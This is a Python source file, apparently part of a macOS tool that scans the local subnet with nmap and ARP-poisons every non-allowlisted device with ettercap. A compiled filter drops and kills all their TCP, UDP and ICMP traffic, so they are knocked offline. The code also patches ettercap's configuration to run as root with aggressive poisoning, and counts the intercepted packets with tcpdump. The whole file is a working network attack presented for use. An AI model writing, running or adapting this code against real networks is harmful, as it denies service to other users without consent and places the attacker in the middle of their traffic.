def detect():
    iface = sh("route get default 2>/dev/null | awk '/interface:/ {print $2}'")
    self_ip = sh(f"ipconfig getifaddr {iface}")
    gw = sh("route get default 2>/dev/null | awk '/gateway:/ {print $2}'")
    mac = re.search(r"ether ([0-9a-f:]{17})", sh(f"ifconfig {iface}")).group(1)
    ssid = ""
    try:
        out = sh(f"ipconfig getsummary {iface}")
        m = re.search(r"^\s*SSID\s*:\s*(.+)$", out, re.M)
        if m:
            ssid = m.group(1).strip()
    except Exception:
        pass
    if not ssid:
        try:
            line = sh(f"networksetup -getairportnetwork {iface}")
            if ": " in line and "not associated" not in line.lower():
                ssid = line.split(": ", 1)[1].strip()
        except Exception:
            pass
    return iface, self_ip, gw, mac, ssid or "(unknown)"


def ensure_drop_filter():
    os.makedirs(DATA_DIR, exist_ok=True)
    if os.path.exists(DROP):
        return
    with open(DROP_SRC, "w") as f:
        f.write("if (ip.proto == TCP)  { drop(); kill(); }\n")
        f.write("if (ip.proto == UDP)  { drop(); kill(); }\n")
        f.write("if (ip.proto == ICMP) { drop(); kill(); }\n")
    subprocess.check_call(
        [ETTERFILTER, DROP_SRC, "-o", DROP],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def load_allowlist():
    try:
        with open(ALLOWLIST) as f:
            return set(json.load(f))
    except Exception:
        return set()


def save_allowlist(macs):
    os.makedirs(DATA_DIR, exist_ok=True)
    try:
        with open(ALLOWLIST, "w") as f:
            json.dump(sorted(macs), f, indent=2)
    except Exception:
        pass


def scan(subnet):
    try:
        out = subprocess.check_output(
            [NMAP, "-sn", "-n", "-PR", "-PE", "-PS80,443,22", "-PA80",
             "-T4", "--max-retries", "2", "--host-timeout", "3s",
             "--send-eth", str(subnet)],
            text=True, stderr=subprocess.DEVNULL, timeout=20,
        )
    except Exception:
        return {}
    hosts, cur = {}, None
    for line in out.splitlines():
        m = re.search(r"Nmap scan report for ([\d.]+)", line)
        if m:
            cur = m.group(1)
            continue
        m = re.search(r"MAC Address: ([0-9A-F:]{17})\s*\(([^)]*)\)", line)
        if m and cur:
            hosts[cur] = (m.group(1).lower(), m.group(2)[:18])
    return hosts


def build_targets(hosts, self_ip, gw, allow_macs):
    out = []
    for ip, (mac, vendor) in hosts.items():
        if ip == self_ip or ip == gw:
            continue
        if mac in allow_macs:
            continue
        out.append(ip)
    return out


def start_ettercap(iface, gw, target_ips):
    if not target_ips:
        return None
    targets = ";".join(target_ips)
    return subprocess.Popen(
        [ETTERCAP, "-T", "-q", "-i", iface, "-F", DROP,
         "-M", "arp:remote", f"/{gw}//", f"/{targets}//"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )


def kill_ettercap(proc):
    if not proc:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=2)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass


def kill_zombie_ettercap():
    """Kill any leftover ettercap from a prior crash that might fight ours."""
    try:
        subprocess.run(["pkill", "-f", "ettercap"],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
        time.sleep(0.3)
    except Exception:
        pass


def tune_etter_conf():
    """Ensure aggressive ARP poison cadence + root privs in etter.conf."""
    conf = "/opt/homebrew/etc/ettercap/etter.conf"
    if not os.path.exists(conf):
        return
    try:
        with open(conf) as f:
            text = f.read()
        patched = text
        patched = re.sub(r"^ec_uid\s*=\s*65534",
                         "ec_uid = 0", patched, flags=re.M)
        patched = re.sub(r"^ec_gid\s*=\s*65534",
                         "ec_gid = 0", patched, flags=re.M)
        patched = re.sub(r"^arp_poison_warm_up\s*=\s*\d+",
                         "arp_poison_warm_up = 0", patched, flags=re.M)
        patched = re.sub(r"^arp_poison_delay\s*=\s*\d+",
                         "arp_poison_delay = 1", patched, flags=re.M)
        patched = re.sub(r"^arp_storm_delay\s*=\s*\d+",
                         "arp_storm_delay = 1", patched, flags=re.M)
        if patched != text:
            with open(conf, "w") as f:
                f.write(patched)
    except Exception:
        pass


class NetworkWorker(threading.Thread):
    """Background scanner + ettercap manager. Main thread never blocks."""
    def __init__(self, ctx):
        super().__init__(daemon=True)
        self.ctx = ctx
        self.lock = threading.Lock()
        self.hosts = dict(ctx.get("initial_hosts") or {})
        self.target_ips = []
        self.allow = set(ctx.get("allowlist") or set())
        self.proc = None
        self.last_scan_at = 0.0
        self.scanning = False
        self._stop = threading.Event()
        self._kick = threading.Event()
        self._kick.set()                     # immediate first scan + start

    def kick(self):
        self._kick.set()

    def set_allow(self, allow):
        with self.lock:
            self.allow = set(allow)
        self._kick.set()

    def snapshot(self):
        with self.lock:
            return {
                "hosts":      dict(self.hosts),
                "target_ips": list(self.target_ips),
                "allow":      set(self.allow),
                "proc_alive": self.proc is not None,
                "last_scan":  self.last_scan_at,
                "scanning":   self.scanning,
            }

    def stop(self):
        self._stop.set()
        self._kick.set()
        kill_ettercap(self.proc)

    def run(self):
        while not self._stop.is_set():
            with self.lock:
                self.scanning = True
            try:
                fresh = scan(self.ctx["subnet_net"])
            except Exception:
                fresh = {}
            with self.lock:
                self.scanning = False
                if fresh:
                    self.hosts = fresh
                self.last_scan_at = time.time()
                new_targets = build_targets(
                    self.hosts, self.ctx["self_ip"],
                    self.ctx["gw"], self.allow)
                if set(new_targets) != set(self.target_ips):
                    self.target_ips = new_targets
                    kill_ettercap(self.proc)
                    self.proc = start_ettercap(
                        self.ctx["iface"], self.ctx["gw"], self.target_ips)
            self._kick.wait(timeout=3)
            self._kick.clear()


class PacketCounter(threading.Thread):
    def __init__(self, iface, mac, self_ip):
        super().__init__(daemon=True)
        self.count = 0
        self.proc = None
        self.iface = iface
        self.mac = mac.lower()
        self.self_ip = self_ip
        self._stop = threading.Event()

    def run(self):
        bpf = (f"ether dst {self.mac} "
               f"and not ether src {self.mac} "
               f"and not arp "
               f"and not ip dst {self.self_ip} "
               f"and not ip6")
        try:
            self.proc = subprocess.Popen(
                [TCPDUMP, "-i", self.iface, "-n", "-l", "-q", "-p", bpf],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid, bufsize=1, text=True,
            )
            for _ in self.proc.stdout:
                if self._stop.is_set():
                    break
                self.count += 1
        except Exception:
            pass

    def stop(self):
        self._stop.set()
        try:
            os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
        except Exception:
            pass


